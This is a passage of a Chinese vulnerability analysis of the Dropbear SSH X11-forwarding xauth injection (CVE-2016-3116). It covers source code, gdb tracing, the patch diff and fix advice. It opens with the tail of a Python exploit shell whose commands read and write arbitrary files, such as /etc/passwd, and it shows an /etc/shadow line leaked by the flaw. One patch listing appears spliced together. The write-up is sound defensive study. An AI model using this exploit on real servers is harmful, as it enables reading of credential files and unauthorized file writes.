                              )
        LOGGER.info("connected!")
        LOGGER.info ("""
    Available commands:
        .info
        .readfile 
        .writefile  
        .exit .quit
    """)
        while True:
            cmd = raw_input("#> ").strip()
            if cmd.lower().startswith(".exit") or cmd.lower().startswith(".quit"):
                break
            elif cmd.lower().startswith(".info"):
                LOGGER.info(ex.exploit("\ninfo"))
            elif cmd.lower().startswith(".readfile"): 
                LOGGER.info(ex.exploit_fwd_readfile(cmd.split(" ",1)[1]))
            elif cmd.lower().startswith(".writefile"):
                parts = cmd.split(" ")
                LOGGER.info(ex.exploit_fwd_write_(parts[1],' '.join(parts[2:])))
            else:
                LOGGER.info(ex.exploit('\n%s'%cmd))
        # just playing around   
        #print ex.exploit_fwd_readfile("/etc/passwd")
        #print ex.exploit("\ninfo")
        #print ex.exploit("\ngenerate :600 .")                # generate :port  port=port+6000
        #print ex.exploit("\nlist")
        #print ex.exploit("\nnlist")
        #print ex.exploit('\nadd xx xx "\n')
        #print ex.exploit('\ngenerate :0 . data "')
        #print ex.exploit('\n?\n')
        #print ex.exploit_fwd_readfile("/etc/passwd")
        #print ex.exploit_fwd_write_("/tmp/somefile", data="`whoami`")
        LOGGER.info("--quit--")
## 漏洞分析
### 源码分析
根据公开信息，在处理`X11`请求中，会进入`x11req`针对`X11 请求进行预处理，将`cookie`存储在`chansess`中：
    /* called as a request for a session channel, sets up listening X11 */
    /* returns DROPBEAR_SUCCESS or DROPBEAR_FAILURE */
    int x11req(struct ChanSess * chansess) {
        .....
        chansess->x11singleconn = buf_getbool(ses.payload);
        chansess->x11authprot = buf_getstring(ses.payload, NULL);
        chansess->x11authcookie = buf_getstring(ses.payload, NULL);
        chansess->x11screennum = buf_getint(ses.payload);
        .....
    }
然后又会调用到`x11setauth()`函数：
    #ifndef XAUTH_COMMAND
    #define XAUTH_COMMAND "/usr/bin/xauth -q"
    #endif
    /* This is called after switching to the user, and sets up the xauth
     * and environment variables.  */
    void x11setauth(struct ChanSess *chansess) {
        .....
        /* popen is a nice function - code is strongly based on OpenSSH's */
        authprog = popen(XAUTH_COMMAND, "w");
        if (authprog) {
            fprintf(authprog, "add %s %s %s\n",display, chansess->x11authprot, chansess->x11authcookie);
            pclose(authprog);
        } else {
            fprintf(stderr, "Failed to run %s\n", AUTH_COMMAND);
        }
        .....
    }
在`x11setauth`中，会调用`popen`执行`/usr/bin/xauth
-q`,并将`chansess`中存储的`cookie`作为参数，此处参数没有对换行符等进行过滤，因此可以针对`xauth`的参数进行注入。
查看`xauth`的参数解析，发现我们感兴趣的主要是以下几个命令：
    info     - 泄漏一些路径信息
            $ xauth info
            Authority file:       /home/island/.Xauthority
            File new:             no
            File locked:          no
            Number of entries:    6
            Changes honored:      yes
            Changes made:         no
            Current input:        (argv):1
    source   - 任意文件读 (在第一个空格处截断)
            # xauth source /etc/shadow
            xauth:  file /root/.Xauthority does not exist
            xauth: /etc/shadow:1:  unknown command                      "smithj:Ep6mckrOLChF.:10063:0:99999:7:::"
    extract  - 任意文件写 
             对特定字符有先知
             写入的文件是xauth.db格式
             可以与`xauth add`命令结合，而将文件写在任意路径下 
    generate - 连接 : 
             可用于端口检测
通过以上命令，虽然有一些程度限制，但是基本可以做到任意文件读写以及端口检测。
### 动态调试
为了更直观了解，使用`gdb`调试：
    $ sudo gdb-multiarch dropbear
    gef➤  set args -R -F -E -p 2222
    gef➤  b x11req
    Breakpoint 1 at 0x41357f
    gef➤  b x11setauth
    Breakpoint 2 at 0x413732
    gef➤  set follow-fork-mode child
    gef➤  r
    Starting program: /home/island/work/soft/dropbear-2015.71/dropbear -R -F -E -p 2222
    [39700] Oct 24 10:23:47 Not backgrounding
在另一台机器运行`exp`：
    $ python CVE-2016-3116_exp.py 192.168.5.171 2222 island pwsswd
    #> .readfile /etc/passwd
在调试机器中，将断点下在`buf_getstring`，第二次触发断点并返回时，查看返回值:
    gef➤  x /s $rax                                            0x637f40:       "xxxx\nsource /etc/passwd\n"
发现`chansess->x11authcookie`的值正是`exp`中输入的带有换行符的`cookie`值
再继续运行，运行到`x11setauth`中
将断点下载popen中：
    gef➤  b popen
    Breakpoint 4 at 0x7ffff7427600: file iopopen.c, line 273.
    gef➤  c
    Continuing.
    Thread 4.1 "dropbear" hit Breakpoint 4, _IO_new_popen (command=0x422947 "/usr/bin/xauth -q", mode=0x4208ca "w") at iopopen.c:273
可以看到已经断下来，开始运行`/usr/bin/xauth -q`命令
后面便会将我们传入的`cookie`参数传递给`xauth`，由于换行符未进行过滤，因此可以针对`xauth`进行命令注入。
## 补丁对比
下载`dropbear 2016.74`源码，与有漏洞比较
`dropbear 2016.74` NotVulnable:
    /* called as a request for a session channel, sets up listening X11 */
    /* returns DROPBEAR_SUCCESS or DROPBEAR_FAILURE */
    int x11req(struct ChanSess * chansess) {
        .....
        chansess->x11singleconn = buf_getbool(ses.payload);
        chansess->x11authprot = buf_getstring(ses.payload, NULL);
        chansess->x11authcookie = buf_getstring(ses.payload, NULL);
        chansess->x11screennum = buf_getint(ses.payload);
        if (xauth_valid_string(chansess->x11authprot) == DROPBEAR_FAILURE ||
            xauth_valid_string(chansess->x11authcookie) == DROPBEAR_FAILURE) {
            dropbear_log(LOG_WARNING, "Bad xauth request");
            goto fail;
        }
        fd = socket(PF_INET, SOCK_STREAM, 0);
        if (fd x11singleconn = buf_getbool(ses.payload);
        chansess->x11authprot = buf_getstring(ses.payload, NULL);
        chansess->x11authcookie = buf_getstring(ses.payload, NULL);
        chansess->x11screennum = buf_getint(ses.payload);
        fd = socket(PF_INET, SOCK_STREAM, 0);
        if (fd < 0) {
            goto fail;
        }
        .....
    }
可以看出，新版本在获取到用户的输入后将`cookie`传入`xauth_valid_string`进行了检验
    /* Check untrusted xauth strings for metacharacters */
    /* Returns DROPBEAR_SUCCESS/DROPBEAR_FAILURE */
    static int
    xauth_valid_string(const char *s)
    {
        size_t i;
        for (i = 0; s[i] != '\0'; i++) {
            if (!isalnum(s[i]) &&
                s[i] != '.' && s[i] != ':' && s[i] != '/' &&
                s[i] != '-' && s[i] != '_') {
                return DROPBEAR_FAILURE;
            }
        }
        return DROPBEAR_SUCCESS;
    }
可以看出，`xauth_valid_string`还是做了比较严格的检查，使用`isalnum`函数检查，只可以是数字字母，否则便会返回失败。
## 修复建议
  * 升级至`dropbear 2016.72`之后的版本。
或者
  * 在`dropbear`编译时，删除`options.h` 中的 `#define ENABLE_X11FWD`选项，以关闭`X11Forwarding`功能。
## 参考链接
  1. [https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-3116/](https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-3116)